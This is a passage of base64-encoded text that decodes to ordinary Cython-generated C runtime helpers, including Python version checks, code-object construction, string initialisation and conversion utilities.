ICAgICAgIGRpZ2l0ID0gMDsKICAgICAgICAgICAgZmFjdG9yID4+PSA4OwogICAgICAgICAgICArK2k7CiAgICAgICAgfQogICAgICAgIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSB2ZXJzaW9uOwogICAgfQogICAgcmV0dXJuIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb247CiNlbmRpZgp9CgoKc3RhdGljIGludCBfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbih1bnNpZ25lZCBsb25nIGN0X3ZlcnNpb24sIHVuc2lnbmVkIGxvbmcgcnRfdmVyc2lvbiwgaW50IGFsbG93X25ld2VyKSB7CiAgICBjb25zdCB1bnNpZ25lZCBsb25nIE1BSk9SX01JTk9SID0gMHhGRkZGMDAwMFVMOwogICAgaWYgKChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID09IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKQogICAgICAgIHJldHVybiAwOwogICAgaWYgKGxpa2VseShhbGxvd19uZXdlciAmJiAocnRfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSA+IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKSkKICAgICAgICByZXR1cm4gMTsKICAgIHsKICAgICAgICBjaGFyIG1lc3NhZ2VbMjAwXTsKICAgICAgICBQeU9TX3NucHJpbnRmKG1lc3NhZ2UsIHNpemVvZihtZXNzYWdlKSwKICAgICAgICAgICAgICAgICAgICAgICJjb21waWxlIHRpbWUgUHl0aG9uIHZlcnNpb24gJWQuJWQgIgogICAgICAgICAgICAgICAgICAgICAgIm9mIG1vZHVsZSAnJS4xMDBzJyAiCiAgICAgICAgICAgICAgICAgICAgICAiJXMgIgogICAgICAgICAgICAgICAgICAgICAgInJ1bnRpbWUgdmVyc2lvbiAlZC4lZCIsCiAgICAgICAgICAgICAgICAgICAgICAgKGludCkgKGN0X3ZlcnNpb24gPj4gMjQpLCAoaW50KSAoKGN0X3ZlcnNpb24gPj4gMTYpICYgMHhGRiksCiAgICAgICAgICAgICAgICAgICAgICAgX19QeXhfTU9EVUxFX05BTUUsCiAgICAgICAgICAgICAgICAgICAgICAgKGFsbG93X25ld2VyKSA/ICJ3YXMgbmV3ZXIgdGhhbiIgOiAiZG9lcyBub3QgbWF0Y2giLAogICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChydF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChydF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpCiAgICAgICApOwogICAgICAgIHJldHVybiBQeUVycl9XYXJuRXgoTlVMTCwgbWVzc2FnZSwgMSk7CiAgICB9Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fUHlDb2RlX05ldyhpbnQgYSwgaW50IHAsIGludCBrLCBpbnQgbCwgaW50IHMsIGludCBmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmMsIFB5T2JqZWN0KiBuLCBQeU9iamVjdCAqdiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmZ2LCBQeU9iamVjdCAqY2VsbCwgUHlPYmplY3QqIGZuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgaW50IGZsaW5lLCBQeU9iamVjdCAqbG5vcykgewogICAgICAgIFB5T2JqZWN0ICpleGNlcHRpb25fdGFibGUgPSBOVUxMOwogICAgICAgIFB5T2JqZWN0ICp0eXBlc19tb2R1bGU9TlVMTCwgKmNvZGVfdHlwZT1OVUxMLCAqcmVzdWx0PU5VTEw7CiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwCiAgICAgICAgUHlPYmplY3QgKnZlcnNpb25faW5mbzsKICAgICAgICBQeU9iamVjdCAqcHlfbWlub3JfdmVyc2lvbiA9IE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICAgICAgbG9uZyBtaW5vcl92ZXJzaW9uID0gMDsKICAgICAgICBQeU9iamVjdCAqdHlwZSwgKnZhbHVlLCAqdHJhY2ViYWNrOwogICAgICAgIFB5RXJyX0ZldGNoKCZ0eXBlLCAmdmFsdWUsICZ0cmFjZWJhY2spOwogICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDAKICAgICAgICBtaW5vcl92ZXJzaW9uID0gMTE7CiAgICAgICAgI2Vsc2UKICAgICAgICBpZiAoISh2ZXJzaW9uX2luZm8gPSBQeVN5c19HZXRPYmplY3QoInZlcnNpb25faW5mbyIpKSkgZ290byBlbmQ7CiAgICAgICAgaWYgKCEocHlfbWlub3JfdmVyc2lvbiA9IFB5U2VxdWVuY2VfR2V0SXRlbSh2ZXJzaW9uX2luZm8sIDEpKSkgZ290byBlbmQ7CiAgICAgICAgbWlub3JfdmVyc2lvbiA9IFB5TG9uZ19Bc0xvbmcocHlfbWlub3JfdmVyc2lvbik7CiAgICAgICAgUHlfREVDUkVGKHB5X21pbm9yX3ZlcnNpb24pOwogICAgICAgIGlmIChtaW5vcl92ZXJzaW9uID09IC0xICYmIFB5RXJyX09jY3VycmVkKCkpIGdvdG8gZW5kOwogICAgICAgICNlbmRpZgogICAgICAgIGlmICghKHR5cGVzX21vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgidHlwZXMiKSkpIGdvdG8gZW5kOwogICAgICAgIGlmICghKGNvZGVfdHlwZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcodHlwZXNfbW9kdWxlLCAiQ29kZVR5cGUiKSkpIGdvdG8gZW5kOwogICAgICAgIGlmIChtaW5vcl92ZXJzaW9uIDw9IDcpIHsKICAgICAgICAgICAgKHZvaWQpcDsKICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpT09PT09PaU9PTyIsIGEsIGssIGwsIHMsIGYsIGNvZGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zLCBmdiwgY2VsbCk7CiAgICAgICAgfSBlbHNlIGlmIChtaW5vcl92ZXJzaW9uIDw9IDEwKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaWlPT09PT09pT09PIiwgYSxwLCBrLCBsLCBzLCBmLCBjb2RlLAogICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICghKGV4Y2VwdGlvbl90YWJsZSA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoTlVMTCwgMCkpKSBnb3RvIGVuZDsKICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT09pT09PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSwKICAgICAgICAgICAgICAgICAgICAgICAgICBjLCBuLCB2LCBmbiwgbmFtZSwgbmFtZSwgZmxpbmUsIGxub3MsIGV4Y2VwdGlvbl90YWJsZSwgZnYsIGNlbGwpOwogICAgICAgIH0KICAgIGVuZDoKICAgICAgICBQeV9YREVDUkVGKGNvZGVfdHlwZSk7CiAgICAgICAgUHlfWERFQ1JFRihleGNlcHRpb25fdGFibGUpOwogICAgICAgIFB5X1hERUNSRUYodHlwZXNfbW9kdWxlKTsKICAgICAgICBpZiAodHlwZSkgewogICAgICAgICAgICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0cmFjZWJhY2spOwogICAgICAgIH0KICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMDAwCiAgc3RhdGljIFB5Q29kZU9iamVjdCogX19QeXhfX1B5Q29kZV9OZXcoaW50IGEsIGludCBwLCBpbnQgaywgaW50IGwsIGludCBzLCBpbnQgZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmMsIFB5T2JqZWN0KiBuLCBQeU9iamVjdCAqdiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIGludCBmbGluZSwgUHlPYmplY3QgKmxub3MpIHsKICAgIFB5Q29kZU9iamVjdCAqcmVzdWx0OwogICAgcmVzdWx0ID0KICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAgICAgICBQeVVuc3RhYmxlX0NvZGVfTmV3V2l0aFBvc09ubHlBcmdzCiAgICAgICNlbHNlCiAgICAgICAgUHlDb2RlX05ld1dpdGhQb3NPbmx5QXJncwogICAgICAjZW5kaWYKICAgICAgICAoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBuYW1lLCBmbGluZSwgbG5vcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMpOwogICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGMwMEExCiAgICBpZiAobGlrZWx5KHJlc3VsdCkpCiAgICAgICAgcmVzdWx0LT5fY29fZmlyc3R0cmFjZWFibGUgPSAwOwogICAgI2VuZGlmCiAgICByZXR1cm4gcmVzdWx0OwogIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBCMiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgI2RlZmluZSBfX1B5eF9fUHlDb2RlX05ldyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVwKICAgICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3MoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcykKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X19QeUNvZGVfTmV3KGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpXAogICAgICAgICAgUHlDb2RlX05ldyhhLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeUNvZGVfTmV3KAogICAgICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IsCiAgICAgICAgUHlPYmplY3QgKiBjb25zdCAqdmFybmFtZXMsCiAgICAgICAgUHlPYmplY3QgKmZpbGVuYW1lLAogICAgICAgIFB5T2JqZWN0ICpmdW5jbmFtZSwKICAgICAgICBjb25zdCBjaGFyICpsaW5lX3RhYmxlLAogICAgICAgIFB5T2JqZWN0ICp0dXBsZV9kZWR1cF9tYXAKKSB7CiAgICBQeU9iamVjdCAqY29kZV9vYmogPSBOVUxMLCAqdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBOVUxMLCAqY29kZV9ieXRlcyA9IE5VTEwsICpsaW5lX3RhYmxlX2J5dGVzID0gTlVMTDsKICAgIFB5X3NzaXplX3QgdmFyX2NvdW50ID0gKFB5X3NzaXplX3QpIGRlc2NyLm5sb2NhbHM7CiAgICBQeU9iamVjdCAqdmFybmFtZXNfdHVwbGUgPSBQeVR1cGxlX05ldyh2YXJfY291bnQpOwogICAgaWYgKHVubGlrZWx5KCF2YXJuYW1lc190dXBsZSkpIHJldHVybiBOVUxMOwogICAgZm9yIChQeV9zc2l6ZV90IGk9MDsgaSA8IHZhcl9jb3VudDsgaSsrKSB7CiAgICAgICAgUHlfSU5DUkVGKHZhcm5hbWVzW2ldKTsKICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YXJuYW1lc190dXBsZSwgaSwgdmFybmFtZXNbaV0pICE9ICgwKSkgZ290byBkb25lOwogICAgfQogICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gUHlEaWN0X0dldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSk7CiAgICBpZiAoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KFB5RGljdF9TZXRJdGVtKHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUsIHZhcm5hbWVzX3R1cGxlKSA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSB2YXJuYW1lc190dXBsZTsKICAgIH0KICAgICNlbHNlCiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9TZXREZWZhdWx0KHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUsIHZhcm5hbWVzX3R1cGxlKTsKICAgIGlmICh1bmxpa2VseSghdmFybmFtZXNfdHVwbGVfZGVkdXApKSBnb3RvIGRvbmU7CiAgICAjZW5kaWYKICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfSU5DUkVGKHZhcm5hbWVzX3R1cGxlX2RlZHVwKTsKICAgICNlbmRpZgogICAgaWYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGUgIT0gTlVMTAogICAgICAgICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMKSB7CiAgICAgICAgbGluZV90YWJsZV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUobGluZV90YWJsZSwgZGVzY3IubGluZV90YWJsZV9sZW5ndGgpOwogICAgICAgIGlmICh1bmxpa2VseSghbGluZV90YWJsZV9ieXRlcykpIGdvdG8gZG9uZTsKICAgICAgICBQeV9zc2l6ZV90IGNvZGVfbGVuID0gKGRlc2NyLmxpbmVfdGFibGVfbGVuZ3RoICogMiArIDQpICYgfjM7CiAgICAgICAgY29kZV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoTlVMTCwgY29kZV9sZW4pOwogICAgICAgIGlmICh1bmxpa2VseSghY29kZV9ieXRlcykpIGdvdG8gZG9uZTsKICAgICAgICBjaGFyKiBjX2NvZGVfYnl0ZXMgPSBQeUJ5dGVzX0FzU3RyaW5nKGNvZGVfYnl0ZXMpOwogICAgICAgIGlmICh1bmxpa2VseSghY19jb2RlX2J5dGVzKSkgZ290byBkb25lOwogICAgICAgIG1lbXNldChjX2NvZGVfYnl0ZXMsIDAsIChzaXplX3QpIGNvZGVfbGVuKTsKICAgIH0KICAgIGNvZGVfb2JqID0gKFB5T2JqZWN0KikgX19QeXhfX1B5Q29kZV9OZXcoCiAgICAgICAgKGludCkgZGVzY3IuYXJnY291bnQsCiAgICAgICAgKGludCkgZGVzY3IubnVtX3Bvc29ubHlfYXJncywKICAgICAgICAoaW50KSBkZXNjci5udW1fa3dvbmx5X2FyZ3MsCiAgICAgICAgKGludCkgZGVzY3IubmxvY2FscywKICAgICAgICAwLAogICAgICAgIChpbnQpIGRlc2NyLmZsYWdzLAogICAgICAgIGNvZGVfYnl0ZXMgPyBjb2RlX2J5dGVzIDogX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMsCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsCiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAsCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsCiAgICAgICAgZmlsZW5hbWUsCiAgICAgICAgZnVuY25hbWUsCiAgICAgICAgKGludCkgZGVzY3IuZmlyc3RfbGluZSwKICAgICAgICAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAoMHgwMzBiMDAwMCkgJiYgbGluZV90YWJsZV9ieXRlcykgPyBsaW5lX3RhYmxlX2J5dGVzIDogX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMKICAgICk7CmRvbmU6CiAgICBQeV9YREVDUkVGKGNvZGVfYnl0ZXMpOwogICAgUHlfWERFQ1JFRihsaW5lX3RhYmxlX2J5dGVzKTsKICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgUHlfWERFQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7CiAgICAjZW5kaWYKICAgIFB5X0RFQ1JFRih2YXJuYW1lc190dXBsZSk7CiAgICByZXR1cm4gY29kZV9vYmo7Cn0KCgpzdGF0aWMgaW50IF9fUHl4X0luaXRTdHJpbmdzKF9fUHl4X1N0cmluZ1RhYkVudHJ5IGNvbnN0ICp0LCBQeU9iamVjdCAqKnRhcmdldCwgY29uc3QgY2hhciogY29uc3QqIGVuY29kaW5nX25hbWVzKSB7CiAgICB3aGlsZSAodC0+cykgewogICAgICAgIFB5T2JqZWN0ICpzdHI7CiAgICAgICAgaWYgKHQtPmlzX3VuaWNvZGUpIHsKICAgICAgICAgICAgaWYgKHQtPmludGVybikgewogICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcodC0+cyk7CiAgICAgICAgICAgIH0gZWxzZSBpZiAodC0+ZW5jb2RpbmcpIHsKICAgICAgICAgICAgICAgIHN0ciA9IFB5VW5pY29kZV9EZWNvZGUodC0+cywgdC0+biAtIDEsIGVuY29kaW5nX25hbWVzW3QtPmVuY29kaW5nXSwgTlVMTCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc3RyID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSh0LT5zLCB0LT5uIC0gMSk7CiAgICAgICAgfQogICAgICAgIGlmICghc3RyKQogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgKnRhcmdldCA9IHN0cjsKICAgICAgICBpZiAoUHlPYmplY3RfSGFzaChzdHIpID09IC0xKQogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgKyt0OwogICAgICAgICsrdGFyZ2V0OwogICAgfQogICAgcmV0dXJuIDA7Cn0KCiNpbmNsdWRlIDxzdHJpbmcuaD4Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9zc2l6ZV9zdHJsZW4oY29uc3QgY2hhciAqcykgewogICAgc2l6ZV90IGxlbiA9IHN0cmxlbihzKTsKICAgIGlmICh1bmxpa2VseShsZW4gPiAoc2l6ZV90KSBQWV9TU0laRV9UX01BWCkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwgImJ5dGUgc3RyaW5nIGlzIHRvbyBsb25nIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIChQeV9zc2l6ZV90KSBsZW47Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKGNvbnN0IGNoYXIqIGNfc3RyKSB7CiAgICBQeV9zc2l6ZV90IGxlbiA9IF9fUHl4X3NzaXplX3N0cmxlbihjX3N0cik7CiAgICBpZiAodW5saWtlbHkobGVuIDwgMCkpIHJldHVybiBOVUxMOwogICAgcmV0dXJuIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgbGVuKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikgewogICAgUHlfc3NpemVfdCBsZW4gPSBfX1B5eF9zc2l6ZV9zdHJsZW4oY19zdHIpOwogICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDsKICAgIHJldHVybiBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgbGVuKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhQeU9iamVjdCogbykgewogICAgUHlfc3NpemVfdCBpZ25vcmU7CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKG8sICZpZ25vcmUpOwp9CiNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSSB8fCBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4CnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5VW5pY29kZV9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqIG8sIFB5X3NzaXplX3QgKmxlbmd0aCkgewogICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShvKSA9PSAtMSkpIHJldHVybiBOVUxMOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgewogICAgICAgIGNvbnN0IGNoYXIqIHJlc3VsdDsKICAgICAgICBQeV9zc2l6ZV90IHVuaWNvZGVfbGVuZ3RoOwogICAgICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKHVuaWNvZGVfbGVuZ3RoKTsgLy8gb25seSBmb3IgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkKICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKICAgICAgICBpZiAodW5saWtlbHkoUHlBcmdfUGFyc2UobywgInMjIiwgJnJlc3VsdCwgbGVuZ3RoKSA8IDApKSByZXR1cm4gTlVMTDsKICAgICAgICAjZWxzZQogICAgICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7CiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICAgICAgdW5pY29kZV9sZW5ndGggPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKG8pOwogICAgICAgIGlmICh1bmxpa2VseSh1bmljb2RlX2xlbmd0aCA8IDApKSByZXR1cm4gTlVMTDsKICAgICAgICBpZiAodW5saWtlbHkodW5pY29kZV9sZW5ndGggIT0gKmxlbmd0aCkpIHsKICAgICAgICAgICAgUHlVbmljb2RlX0FzQVNDSUlTdHJpbmcobyk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQojZWxzZQojaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkKICAgIGlmIChsaWtlbHkoUHlVbmljb2RlX0lTX0FTQ0lJKG8pKSkgewogICAgICAgICpsZW5ndGggPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKTsKICAgICAgICByZXR1cm4gUHlVbmljb2RlX0FzVVRGOChvKTsKICAgIH0gZWxzZSB7CiAgICAgICAgUHlVbmljb2RlX0FzQVNDSUlTdHJpbmcobyk7CiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICB9CiNlbHNlCiAgICByZXR1cm4gUHlVbmljb2RlX0FzVVRGOEFuZFNpemUobywgbGVuZ3RoKTsKI2VuZGlmCiNlbmRpZgp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqIG8sIFB5X3NzaXplX3QgKmxlbmd0aCkgewojaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOAogICAgaWYgKFB5VW5pY29kZV9DaGVjayhvKSkgewogICAgICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKG8sIGxlbmd0aCk7CiAgICB9IGVsc2UKI2VuZGlmCiAgICBpZiAoUHlCeXRlQXJyYXlfQ2hlY2sobykpIHsKI2lmIChDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKSB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIChkZWZpbmVkKFB5Qnl0ZUFycmF5X0FTX1NUUklORykgJiYgZGVmaW5lZChQeUJ5dGVBcnJheV9HRVRfU0laRSkpKQogICAgICAgICpsZW5ndGggPSBQeUJ5dGVBcnJheV9HRVRfU0laRShvKTsKICAgICAgICByZXR1cm4gUHlCeXRlQXJyYXlfQVNfU1RSSU5HKG8pOwojZWxzZQogICAgICAgICpsZW5ndGggPSBQeUJ5dGVBcnJheV9TaXplKG8pOwogICAgICAgIGlmICgqbGVuZ3RoID09IC0xKSByZXR1cm4gTlVMTDsKICAgICAgICByZXR1cm4gUHlCeXRlQXJyYXlfQXNTdHJpbmcobyk7CiNlbmRpZgogICAgfSBlbHNlCiAgICB7CiAgICAgICAgY2hhciogcmVzdWx0OwogICAgICAgIGludCByID0gUHlCeXRlc19Bc1N0cmluZ0FuZFNpemUobywgJnJlc3VsdCwgbGVuZ3RoKTsKICAgICAgICBpZiAodW5saWtlbHkociA8IDApKSB7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7CiAgICAgICAgfQogICAgfQp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqIHgpIHsKICAgaW50IGlzX3RydWUgPSB4ID09IFB5X1RydWU7CiAgIGlmIChpc190cnVlIHwgKHggPT0gUHlfRmFsc2UpIHwgKHggPT0gUHlfTm9uZSkpIHJldHVybiBpc190cnVlOwogICBlbHNlIHJldHVybiBQeU9iamVjdF9Jc1RydWUoeCk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCogeCkgewogICAgaW50IHJldHZhbDsKICAgIGlmICh1bmxpa2VseSgheCkpIHJldHVybiAtMTsKICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZSh4KTsKICAgIFB5X0RFQ1JFRih4KTsKICAgIHJldHVybiByZXR2YWw7Cn0Kc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nV3JvbmdSZXN1bHRUeXBlKFB5T2JqZWN0KiByZXN1bHQpIHsKICAgIF9fUHl4X1R5cGVOYW1lIHJlc3VsdF90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUocmVzdWx0KSk7CiAgICBpZiAoUHlMb25nX0NoZWNrKHJlc3VsdCkpIHsKICAgICAgICBpZiAoUHlFcnJfV2FybkZvcm1hdChQeUV4Y19EZXByZWNhdGlvbldhcm5pbmcsIDEsCiAgICAgICAgICAgICAgICAiX19pbnRfXyByZXR1cm5lZCBub24taW50ICh0eXBlICIgX19QeXhfRk1UX1RZUEVOQU1FICIpLiAgIgogICAgICAgICAgICAgICAgIlRoZSBhYmlsaXR5IHRvIHJldHVybiBhbiBpbnN0YW5jZSBvZiBhIHN0cmljdCBzdWJjbGFzcyBvZiBpbnQgaXMgZGVwcmVjYXRlZCwgIgogICAgICAgICAgICAgICAgImFuZCBtYXkgYmUgcmVtb3ZlZCBpbiBhIGZ1dHVyZSB2ZXJzaW9uIG9mIFB5dGhvbi4iLAogICAgICAgICAgICAgICAgcmV